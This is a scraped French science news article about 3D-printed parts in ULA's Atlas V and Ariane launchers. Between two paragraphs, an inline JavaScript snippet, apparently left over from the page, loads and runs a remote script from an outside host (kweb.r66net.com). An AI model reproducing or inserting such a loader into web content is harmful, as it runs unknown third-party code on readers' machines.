{"title": "L'impression 3D, une arme redoutable pour les lanceurs", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2018-01-03", "content": "L'impression 3D peut ameliorer la competitivite de bien des lanceurs. Dernier exemple en date avec  United Launch Alliance , qui a utilise ce processus pour fabriquer un conduit. Cela a permis de reduire considerablement le nombre de pieces. L'element en question vole a present a bord des lanceurs Atlas V. L' impression 3D , ou fabrication additive, peut desormais etre integree au sein de projets spatiaux.  United Launch Alliance  (ULA), qui construit et opere les  lanceurs  des familles Delta et Atlas, utilise cette technologie dans la production de certaines pieces de ces deux types de lanceurs. Ces derniers seront progressivement remplaces a l'horizon 2020 par  Vulcan , un lanceur a deux etages partiellement reutilisable, pour faire face a la concurrence de  SpaceX  et a la necessite de ne plus dependre des technologies russes. En effet, ULA, qui a pour seul client le gouvernement des Etats-Unis, doit maintenant composer avec la societe SpaceX (cette derniere est autorisee, depuis mai 2015, a repondre a des offres de lancements publiques). Et, pour baisser les couts de fabrication de ses lanceurs en service, ULA utilise, depuis plusieurs lancements, des pieces en fabrication additive. Cette technologie lui a par exemple permis de fabriquer un conduit de lanceur en reduisant considerablement le nombre de pieces. Ce conduit du systeme de conditionnement d'air vole aujourd'hui a bord des lanceurs Atlas V. Comme l'entreprise americaine Boom Supersonic, qui a en projet un  avion supersonique  (pour 2023), ULA s'est tournee vers les solutions de la societe americaine Stratasys, dont le materiau est Ultem 9085, un thermoplastique FDM. La technologie de Stratasys, qui permet de supporter une vaste plage de temperatures extremes, a permis de realiser le conduit du systeme de conditionnement d'air (ECS) de l'Atlas V. (c) ULA                               Un thermoplastique resistant aux temperatures extremes Avant d'utiliser ce thermoplastique pour la realisation de pieces de lanceur, ULA s'est d'abord assuree de ses capacites de resistance, tant a des temperatures cryogeniques qu'aux chaleurs extremes. La societe s'est aussi assuree que le materiau etait assez solide pour supporter les vibrations et les contraintes inherentes au decollage et au vol.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Parmi les pieces fabriquees en impression 3D, ULA a donc, notamment, realise un processus de mise a niveau du conduit du systeme de conditionnement d'air (ECS) de l'Atlas V. Le conduit de l'ECS est un element critique lors du compte a rebours d'un lancement, car il alimente en azote des composants electroniques sensibles a l'interieur de la fusee. Le precedent conduit de l'ECS contenait 140 pieces ; en le modifiant a l'aide de la fabrication additive, ULA a reduit le nombre de pieces a 16. Ainsi, elle a considerablement reduit les delais d'installation et, par consequent, les couts (avec une reduction de pres de 57 %).  Greg Arend, responsable du programme de fabrication additive chez ULA, souligne : <<  Nous prevoyons une croissance exponentielle de l'utilisation de l'impression 3D pour les applications en vol sur nos lanceurs actuels et nous avons l'intention d'y recourir massivement pour notre lanceur Vulcan  >>.  ArianeGroup utilise egalement l'impression 3D :  Ariane 6  sera une famille de lanceurs qui utilisera cette technologie ; certaines pieces ne pourront etre realisees que par ce procede de fabrication (voir article ci-dessous). Pour en savoir plus L'impression 3D pour les lanceurs Ariane Article de  Remy Decourt  publie le 25/01/2017 Dans les moteurs de la future Ariane 6 et, plus encore, dans les programmes a venir, l'impression 3D, ou fabrication additive, commence a s'imposer. Deja, l'actuel Vulcain 2, en service aujourd'hui, exploite cette technique. Elle reduit considerablement les temps et les couts de production, et permet de realiser des pieces a peu pres impossibles a construire avec des methodes classiques. Decouvrez ces objets etranges, a embarquer dans les lanceurs du futur. Le secteur spatial a vite adopte la fabrication additive, plus communement appelee impression 3D. Cette technologie permet de produire en seulement quelques heures des pieces de formes complexes difficiles ou tres longues a realiser avec les techniques classiques, moulage ou usinage. Outre ce gain de temps, le recours a l'impression 3D permet une reduction tres importante des couts et des cycles de fabrication. Chez Airbus Safran Launchers, les pieces en impression 3D existent deja, avec, de gauche a droite, une piece pour le moteur Vulcain 2, le moteur Vinci et Promethee. (c) Remy Decourt                               Cette technique de fabrication est d'ailleurs tres bien adaptee aux produits spatiaux car elle permet de realiser des pieces monoblocs, c'est-a-dire sans qu'il soit necessaire d'assembler des pieces par vis, collage ou  soudures . C'est notamment vrai pour des  composants de satellites , de moteurs spatiaux et de lanceurs. Croix de cardan du Vulcain 2 d'Ariane 5 realisee en fabrication additive a partir d'une poudre d'Inconel 718. (c) Airbus Safran Launchers                               Une technique de fabrication adaptee aux produits spatiaux Airbus Safran Launchers  l'a bien compris. Sur Ariane 6, la  fabrication additive  sera beaucoup utilisee pour realiser ce lanceur concu avec l'objectif d'etre tres competitif des son entree en service. Dans certains  generateurs  de  gaz , des pieces ne seront pas realisables par les moyens classiques, et imposeront donc la 3D. Les caracteristiques mecaniques statiques des pieces monoblocs realisees par la fabrication additive etant proches de celles du forge et bien superieures a celles de la fonderie, Airbus  Safran  Launchers l'utilise egalement pour la realisation de pieces du moteur Vulcain 2 d' Ariane 5  et du Vinci de l'etage superieur rallumable d' Ariane 6 . Une premiere piece du moteur Promethee en impression 3D (un carter de pompe). Cette piece, essentielle au moteur, est impossible a realiser avec les techniques de fabrications classiques. Le secret industriel et la performance de la fabrication additive ne se devoilent qu'a l'interieur de cette piece parcourue de plusieurs centaines de petits tubes. (c) Remy Decourt                               Une premiere piece structurale du moteur Vulcain 2, obtenue par fabrication additive  metal , a deja vole sur une Ariane 5, lors du  lancement de quatre satellites Galileo , le 17 novembre 2016 (VA233). Elle a ete realisee en fabrication additive avec de la poudre metallique fusionnee par  laser . Pour le moteur rallumable Vinci, Airbus Safran Launchers a realise quelques pieces, dont un collecteur LSPH et un rouet centrifuge de pompe.  La production additive a donc deja fait une apparition remarquee dans les familles Vulcain et Vinci. Mais c'est peu de choses compare au programme du moteur du futur Promethee. Ce moteur, destine a un hypothetique lanceur reutilisable, est pense avec un objectif de cout unitaire divise par 10 par rapport au  Vulcain 2 d'Ariane 5  (1 million contre 10 millions d'euros). Environ 50 % (en valeur) des pieces de Promethee pourraient etre realisees en impression 3D, notamment certaines tuyauteries et vannes, ou la  chambre de combustion . Au passage, la fabrication additive permettra de repenser la conception de certains composants de facon a diminuer le nombre de pieces et d'en realiser certaines impossibles a construire avec les moyens traditionnels. Cela vous interessera aussi Moteurs-fusees : comment sont-ils fabriques ?                       Le developpement et la construction d'un lanceur spatial peuvent prendre des annees, alors que son lancement ne dure que quelques secondes. Cet evenement d'une rare intensite ne pourrait se faire sans des moteurs appropries. Decouvrez en video comment se construisent les moteurs-fusees, un element incontournable de chaque lancement spatial.                                       ", "theme": "sciences"}